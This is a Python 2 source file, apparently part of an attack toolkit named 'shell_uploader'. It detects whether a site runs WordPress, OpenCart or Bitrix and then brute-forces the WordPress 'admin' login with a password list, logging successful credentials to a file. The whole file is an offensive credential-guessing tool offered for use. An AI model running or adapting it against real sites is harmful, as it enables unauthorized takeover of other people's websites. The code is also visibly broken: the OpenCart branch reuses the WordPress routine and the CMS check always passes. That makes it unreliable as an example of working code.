#!/usr/bin/env python
# -*- coding: utf-8 -*-

from modules import logger
log = logger.logger_class()

import urllib2, urllib, time, re

class shell_uploader():

    """
    SHELL UPLOADER
    """

    passwords = []

    # LOAD BRUTEFORCE PASSWORDS
    def load_passwords_list(self):

        try:

            log.info("shell_uploader|load_passwords_list", "Load passwords list.")

            for passwds in open('passwords.txt', 'r+').readlines():
                self.passwords.append(passwds.replace('\n', '').replace('\r', ''))

            log.info("shell_uploader|load_passwords_list", "Load done " + str(len(self.passwords)) + " passwords loaded.")

        except Exception, error_code:
            log.warning("shell_uploader|save_good", str(error_code))
            pass

    # SAVE BRUTEFORCE GOODS
    def save_good(self, data):
        try:

            log.info("shell_uploader|save_good", "Save good data.")
            open('good_admins.txt', 'a+').write(data + '\n')

        except Exception, error_code:
            log.warning("shell_uploader|save_good", str(error_code))
            pass

    # ENGINE BRUTEFORCER
    def engine_bruteforcer(self, url, engine):

        try:

            log.info("shell_uploader|engine_bruteforcer", "Bruteforcer loaded.")

            # WORDPRESS BRUTEFORCER
            if engine == "wp":

                log.info("shell_uploader|engine_bruteforcer", "Engine Bruteforcer: Wordpress | URL: " + url)

                for passwd in self.passwords:

                    try:

                        login = urllib.urlopen(url + "/wp-login.php", "log=admin" + "&pwd=" + passwd).geturl()
                        print passwd

                        if "reauth=1" in login:

                                log.info("shell_uploader|engine_bruteforcer",
                                         "Engine Bruteforcer: Wordpress | URL: " + url +
                                         " | Password for admin found: " + passwd)

                                self.save_good("URL: " + url + " | Login: admin" + " | Password: " + passwd)
                                break

                        time.sleep(2)

                    except Exception, error_code:
                        log.warning("shell_uploader|engine_bruteforcer|wp", str(error_code))
                        pass


            # OPENCART BRUTEFORCER
            if engine == "op":
                log.info("shell_uploader|engine_bruteforcer", "Engine Bruteforcer: OpenCart | URL: " + url)

            log.info("shell_uploader|engine_bruteforcer", "Engine Bruteforcer: OpenCart | URL: " + url)

            for passwd in self.passwords:

                try:

                    login = urllib.urlopen(url + "/wp-login.php", "log=admin" + "&pwd=" + passwd).geturl()
                    print passwd

                    if "reauth=1" in login:
                        log.info("shell_uploader|engine_bruteforcer",
                                 "Engine Bruteforcer: Wordpress | URL: " + url +
                                 " | Password for admin found: " + passwd)

                        self.save_good("URL: " + url + " | Login: admin" + " | Password: " + passwd)
                        break

                    time.sleep(2)

                except Exception, error_code:
                    log.warning("shell_uploader|engine_bruteforcer|wp", str(error_code))
                    pass

            # BITRIX BRUTEFORCER
            if engine == "bit":
                log.info("shell_uploader|engine_bruteforcer", "Engine Bruteforcer: Bitrix | URL: " + url)

        except Exception, error_code:
            log.warning("shell_uploader|engine_bruteforcer", str(error_code))
            pass

    # CHECK CMS WP, Bitrix, Opencart
    def chceck_engine(self, url):

        try:
            log.info("shell_uploader|chceck_engine", "Check engine: " + url)
            response = urllib2.urlopen(url).read()

            """
            Wordpress CHECK 
            Opencard  CHECK
            Bitrix    CHECK
            """

            # CHECK WordPress
            if "WordPress" or "wp-content" in response:
                log.info("shell_uploader|chceck_engine", "URL: " + url + " | Engine: Wordpress")

                # START BRUTEFORCE
                self.engine_bruteforcer(url, "wp")

            # CHECK OpenCart
            elif "OpenCart" in response:
                log.info("shell_uploader|chceck_engine", "URL: " + url + " | Engine: OpenCart")

            # CHECK Bitrix
            elif "bitrix" in response:
                log.info("shell_uploader|chceck_engine", "URL: " + url + " | Engine: Bitrix")

            else:
                print "Engine not found."

        except Exception, error_code:
            log.warning("shell_uploader|chceck_engine", str(error_code))
            pass

    def __init__(self, url):

        try:

            log.info("shell_uploader|__init__", "Engine bruteforcer started.")

            # CHECK ENGINE
            self.load_passwords_list()
            self.chceck_engine(url)

        except Exception, error_code:
            log.warning("shell_uploader|__init__", str(error_code))
            pass
